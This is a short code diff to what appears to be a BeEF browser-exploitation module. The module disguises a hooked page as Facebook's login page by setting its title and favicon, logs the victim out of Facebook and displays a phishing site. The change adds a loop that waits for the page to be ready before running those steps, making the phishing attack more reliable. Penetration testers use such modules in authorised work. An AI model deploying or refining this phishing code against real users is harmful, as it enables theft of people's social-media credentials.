@@ -16,10 +16,21 @@ function logoutFacebook() {
 }
 
 beef.execute(function() {
-	document.title = "Facebook - Log In or Sign Up";
-	beef.browser.changeFavicon("https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico");
-	logoutFacebook();
-    displayPhishingSite();
+    // Wait for DOM to be fully ready
+    function waitForDOM() {
+        if (document.readyState === 'complete' || document.readyState === 'interactive') {
+            // DOM is ready - execute the module
+            document.title = "Facebook - Log In or Sign Up";
+            beef.browser.changeFavicon("https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico");
+            logoutFacebook();
+            displayPhishingSite();
+        } else {
+            // DOM not ready - wait and try again
+            setTimeout(waitForDOM, 100);
+        }
+    }
+    
+    waitForDOM();
 });
 
 function clickedSubmitButton(){
